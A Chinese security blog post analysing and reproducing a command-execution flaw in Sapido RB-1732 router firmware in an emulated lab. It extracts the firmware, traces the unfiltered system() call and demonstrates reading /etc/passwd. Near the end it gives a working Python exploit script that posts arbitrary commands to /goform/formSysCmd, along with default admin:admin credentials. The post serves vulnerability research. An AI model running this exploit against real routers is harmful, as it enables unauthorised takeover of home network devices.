#  物联网安全篇——Sapido RB-1732路由器命令执行漏洞   
原创 SNL团队内部文章  SecNL安全团队   2024-05-04 20:19  
  
# Sapido RB-1732路由器命令执行漏洞复现  
  
## 0x01 漏洞介绍  
  
Sapido 是 SAPIDO 公司开发的一款家用路由器，其 RB-1732 系列 v2.0.43 之前的固件版本存在一处命令执行漏洞。所谓命令执行漏洞，是指服务器没有对执行的命令进行过滤，导致用户可以执行任意的系统命令。命令执行漏洞属于高危的漏洞。该漏洞产生的原因是，服务器的 syscmd.asp 页面没有对传递过来的参数进行过滤，这使得用户以参数的形式将系统命令发送给服务器，并在服务器上执行。  
## 0x02 漏洞分析  
### 固件获取  
  
本次分析使用的固件版本为：RB-1732_TC_v2.0.43  
  
**固件下载地址：**  
  
```
百度云：https://pan.baidu.com/s/1Gj9RDlAQdCDiaLdLzQ2Aag?pwd=8381
```  
  
  
```
微云：https://share.weiyun.com/RjicYRKE
```  
  
### 环境配置  
  
本次分析使用的环境是AttifyOS，一个专门用于物联网渗透测试和分析的镜像，里边预装了许多工具，省去了自己部署环境的时间和精力。可通过  
Github仓库  
里的下载链接下载。  
### 漏洞分析  
  
将下载得到的固件放入虚拟机中，使用 binwalk 提取文件系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ny8tG5SicPMl2JbqKpTRiaYMQQB0Nib6GTVnrzr4ia4NmFV7dHhISvyQCQwdrGlqHcLaedYVIEyUv1ibRaKXhdIc0vw/640?wx_fmt=png&from=appmsg "")  
  
可以看到，该固件使用的是 SquashFS 文件系统，也是使用相对比较多的一种文件系统。  
  
在漏洞介绍中，我们提到，这个系列的路由器漏洞存在命令执行漏洞，原因出在这个 syscmd.asp 页面上。所以，我们先用 find 命令找到 syscmd.asp 文件的位置。  
```
iot@attifyos ~/D/f/_/squashfs-root> find ./ -name "syscmd.asp"
./web/syscmd.asp
```  
  
可以发现，syscmd.asp 文件位于 web 目录下，我们进入该目录，打开 syscmd.asp 文件进行分析。查看该文件的源码如下：  
```
<html>
<! Copyright (c) Realtek Semiconductor Corp., 2003. All Rights Reserved. ->
<head>
<meta http-equiv="Content-Type" content="text/html">
<title>System Command</title>
<script>
function saveClick(){
        field = document.formSysCmd.sysCmd ;
        if(field.value.indexOf("ping")==0 && field.value.indexOf("-c") < 0){
                alert('please add "-c num" to ping command');
                return false;
        }
        if(field.value == ""){
                alert("Command can't be empty");
                field.value = field.defaultValue;
                field.focus();
                return false ;
        }
        return true;
}
</script>
</head>

<body>
<blockquote>
<h2><font color="#0000FF">System Command</font></h2>


<form action=/goform/formSysCmd method=POST name="formSysCmd">
<table border=0 width="500" cellspacing=0 cellpadding=0>
  <tr><font size=2>
 This page can be used to run target system command.
  </tr>
  <tr><hr size=1 noshade align=top></tr>
  <tr>
  	<td>System Command: </td>
	<td><input type="text" name="sysCmd" value="" size="20" maxlength="50"></td>
	<td> <input type="submit" value="Apply" name="apply" onClick='return saveClick()'></td>

  </tr>
</table>
  <input type="hidden" value="/syscmd.asp" name="submit-url">
</form>
  <script language="JavaScript">
  
  </script>

  <textarea rows="15" name="msg" cols="80" wrap="virtual"><% sysCmdLog(); %></textarea>

  <p>
  <input type="button" value="Refresh" name="refresh" onClick="javascript: window.location.reload()">
  <input type="button" value="Close" name="close" onClick="javascript: window.close()"></p>
</blockquote>
</font>
</body>

</html>
```  
  
我们可以看到第29行处，form 表单中的 action 指向了 /goform/formSysCmd。第37行处的 input 框的 name 属性为 sysCmd，这个在后边我们会看到他的作用，他其实就是传递我们发送的命令的参数名字。接着我们跟进 formSysCmd 文件，看看他对我们表单提交的数据如何处理。使用 grep 命令全局搜索 formSysCmd 字符串：  
```
iot@attifyos ~/D/f/_/squashfs-root> grep -r "formSysCmd"
Binary file bin/webs matches
web/obama.asp:        field = document.formSysCmd.sysCmd ;
web/obama.asp:<form action=/goform/formSysCmd method=POST name="formSysCmd">
web/obama.asp:  <form method="post" action="goform/formSysCmd" enctype="multipart/form-data" name="writefile">
web/obama.asp:  <form action="/goform/formSysCmd" method=POST name="readfile">
web/syscmd.asp:        field = document.formSysCmd.sysCmd ;
web/syscmd.asp:<form action=/goform/formSysCmd method=POST name="formSysCmd">
```  
  
可以看到，除了 syscmd.asp 和 obama.asp 这两个页面程序，只有一个结果显示是包含在二进制应用程序 bin/webs 中，可以初步推测 webs 程序是真正的后台处理程序。使用 file 查看下该文件：  
```
iot@attifyos ~/D/f/_/squashfs-root> file bin/webs
bin/webs: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-, corrupted section header size
```  
  
可以看到，是 mips 架构 32 位程序。  
  
我们把 webs 导入到IDA中进行静态分析，保持默认选项不动，点击 OK 。  
  
在上方菜单栏，依次点击 view -> open subviews -> Strings 查看全部字符串，使用 ctrl+F 快捷键搜索 formSysCmd 字符串。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ny8tG5SicPMl2JbqKpTRiaYMQQB0Nib6GTVoMRMHWcyG96GJ1bj9ibQ0xqbdvnJ4PIRyb6O0NpVk8LxOAZdMDxzIIQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到有两个位置存在该字符串，分别位于 0x004044DB 和 0x00471A44 这两个位置，我们依次查看。首先是 0x004044DB 位置，双击进入反汇编窗口后，如下所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ny8tG5SicPMl2JbqKpTRiaYMQQB0Nib6GTVBk5Zevtf4JmY4CSqpYhK8tQQw7yq6ysWuEvhB1zObBpUHnyWXS7ypg/640?wx_fmt=png&from=appmsg "")  
  
再次双击红框处的 formSysCmd字符串，跳转到 formSysCmd 函数的真实位置。  
  
（采用同样的方法我们查看 0x00471A44 位置处的字符串，可以看到两个地址上的内容相同。）  
  
使用 F5 快捷键进行反编译查看 formSysCmd 函数的伪代码，如下：  
```
int __fastcall formSysCmd(int a1)
{
  int Var; // $s4
  _BYTE *v3; // $s1
  _BYTE *v4; // $s5
  int v5; // $s6
  const char *v6; // $s3
  _BYTE *v7; // $s7
  int v8; // $v0
  _DWORD *v9; // $s0
  int v10; // $a0
  const char *v11; // $a1
  int v12; // $v0
  int v13; // $s1
  void (__fastcall *v14)(int, _DWORD *); // $t9
  _BYTE *v15; // $a0
  _BYTE *v16; // $a3
  int v17; // $a0
  int v18; // $v0
  char v20[104]; // [sp+20h] [-68h] BYREF

  Var = websGetVar(a1, "submit-url", &dword_47F498);
  v3 = (_BYTE *)websGetVar(a1, "sysCmd", &dword_47F498);
  v4 = (_BYTE *)websGetVar(a1, "writeData", &dword_47F498);
  v5 = websGetVar(a1, "filename", &dword_47F498);
  v6 = (const char *)websGetVar(a1, "fpath", &dword_47F498);
  v7 = (_BYTE *)websGetVar(a1, "readfile", &dword_47F498);
  if ( *v3 )
  {
    snprintf(v20, 100, "%s 2>&1 > %s", v3);
    system(v20);
  }
······
```  
  
可以看到，在23行处，v3 变量通过 websGetVar 函数获取sysCmd传递过来的内容。还记得吗？刚才提到过 sysCmd 这个字符串，他是 input 框的 name 属性的值。然后接下来，在 if 处，使用 snprintf函数将得到的结果进行拼接并赋值给 v20 变量。紧接着就调用 system 函数执行 v20 里边的内容。注意到，这里并没有对 v20 变量的内容做任何过滤，所以就是这里导致了命令执行漏洞。  
  
Ps：这里有一个奇怪的地方就是，我用IDA反编译出来的 snprintf 函数参数列表里最后只有 v3 变量，而网上的博客里反编译出来的伪代码中，在 v3 之后还有一个 "/tmp/syscmd.log" 字符串，比较奇怪，不过影响不是特别大。我又尝试了使用Ghidra来反编译，如下图所示，可以看到Ghidra反编译出来，snprintf 函数参数列表最后是有字符串的，还是Ghidra对MIPS架构支持的比较好，当然也可能是我IDA没有额外装mips插件的原因。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ny8tG5SicPMl2JbqKpTRiaYMQQB0Nib6GTVgTevCiaFaBJ5fJaibESeLHPmTrlp1eL4Zrpw7kzoDg1BKZ3xqF45MibAA/640?wx_fmt=png&from=appmsg "")  
  
补充一下 websGetVar 函数定义  
  
websGetVar  
函数是Web管理界面服务器WebMux  
提供的API函数之一，用于从请求中获取指定名称的变量值，即从HTTP请求中提取参数值。其函数原型为：  
```
char_t *websGetVar(webs_t wp, char_t *name, char_t *defaultValue);
```  
  
函数参数的含义如下：  
- wp  
：指向当前HTTP请求的webs_t  
结构体指针。该结构体包含了请求相关的信息，如请求方法、URL、头部信息、请求体等等。  
  
- name  
：需要获取的变量名称，即需要提取的参数的名称。  
  
- defaultValue  
：当变量名称不存在时，返回的默认值。  
  
该函数的返回值为字符串类型的变量值，即参数对应的值，如果变量不存在则返回默认值。需要注意的是，返回值是指向静态内存空间的指针，不要尝试释放该指针，也不要尝试修改其指向的内容。  
  
下面是一个使用websGetVar  
函数的例子：  
```
char_t *name = websGetVar(wp, "name", "unknown");
// 获取名为 "name" 的参数的值，如果参数不存在则返回 "unknown"
```  
  
在上面的例子中，如果HTTP请求中包含名为 "name" 的参数，则函数将返回该参数的值，否则将返回 "unknown"。  
## 0x03 漏洞复现  
  
漏洞复现的第一步就是先在本地搭建固件模拟环境，这里使用FAT（Firmware Analysis Toolkit）搭建模拟环境。首先使用FAT将 bin 固件加载进来，模拟固件环境。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ny8tG5SicPMl2JbqKpTRiaYMQQB0Nib6GTVvXdSJia7sBYIzd0khgmZeyVmUJSd361vHcylkDs6IumAhrKnmcpvuNg/640?wx_fmt=png&from=appmsg "")  
  
FAT在启动之后，会自动配置QEMU虚拟机以及网络环境，如上图，我们可以看到倒数第三行，bro 虚拟网卡的网络地址为 192.168.1.1 。我们按下ENTER键，稍等片刻，当看到下图所示内容时就表示环境已经部署好了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ny8tG5SicPMl2JbqKpTRiaYMQQB0Nib6GTVUfP6OHj6db5eWIgQiabY3pdTHAVJ5TV1eqhqjoM6eut2ouEIbichS3Kg/640?wx_fmt=png&from=appmsg "")  
  
此时，我们在浏览器中访问 192.168.1.1 这个地址后，会自动跳转到 /admin.asp ，显示路由器的管理页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ny8tG5SicPMl2JbqKpTRiaYMQQB0Nib6GTV4lur6ukC4TGxmCqJYJSMZZRnFrq0Py7ceRxpXjnA8PSo39FGogxs2Q/640?wx_fmt=png&from=appmsg "")  
  
默认账号密码为 admin：admin，我们输入账号密码登录后，页面显示如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ny8tG5SicPMl2JbqKpTRiaYMQQB0Nib6GTVyicibnNRM0zpVAIAoluCKoX7AiaCUtazk3ZKhaF9dRxETSkngRwlpN66A/640?wx_fmt=png&from=appmsg "")  
  
接下来，我们访问有漏洞的页面 /syscmd.asp ，如下图所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ny8tG5SicPMl2JbqKpTRiaYMQQB0Nib6GTVyuVibMibrV46oq49H5YXhjtiap36FvjBqjU8JhzyTokcOAyRF7jBAiaZFg/640?wx_fmt=png&from=appmsg "")  
  
看到这个页面，再看我们之前看到的 syscmd.asp 的源码就容易理解多了。我们在 input 框输入命令 cat /etc/passwd  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ny8tG5SicPMl2JbqKpTRiaYMQQB0Nib6GTVIPt8mAxJccuUHUKxQ9SJwWUVEfDXjWy6xVA7aPAOUG7DA850KzPOIw/640?wx_fmt=png&from=appmsg "")  
  
可以看到，命令成功执行。  
  
我们可以抓包来看一下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ny8tG5SicPMl2JbqKpTRiaYMQQB0Nib6GTV7dSP1e7CYoKp5Hvdmmc4tlhGIxGjuVuYfayWwaRPCA5xfKhulFQuew/640?wx_fmt=png&from=appmsg "")  
  
可以看到 sysCmd 参数就是传递我们命令的参数，从第一行也可以看到，真正执行命令的后台程序为 /goform/formSysCmd 。感觉也是为我们分析漏洞多了一种思路。  
  
我们也可以通过exploit脚本来攻击该漏洞：  
```
#rb1732_exploit.py
import requests
import sys

def test_httpcommand(ip, command):
    my_data = {'sysCmd': command, 'apply':'Apply', 'submit-url':'/syscmd.asp', 'msg':''}
    r = requests.post('http://%s/goform/formSysCmd' % ip, data = my_data)
    content = r.text
    content = content[
        content.find('textarea row="15" name="msg" cols="80" wrap="virtual">')+56:content.rfind('</textarea>')
    ]
    return content

print test_httpcommand(sys.argv[1]," ".join(sys.argv[2:]))
```  
  
执行结果如下：  
```
iot@attifyos ~/D/firmware> python rb1732_exploir.py 192.168.1.1 "cat /etc/passwd"
root:x:0:0:root:/:/bin/sh
nobody:x:0:0:nobody:/:/dev/null
ftp:x:501:501::/var/home/anonymous:/dev/null
ftpuser:x:502:502::/var/home:/dev/null
admin:x:503:503::/home:/dev/null
```  
## 0x04 参考链接  
  
  
http://www.mchz.com.cn/cn/service/Safety-Lab/info_26_itemid_6142.html  
  
  
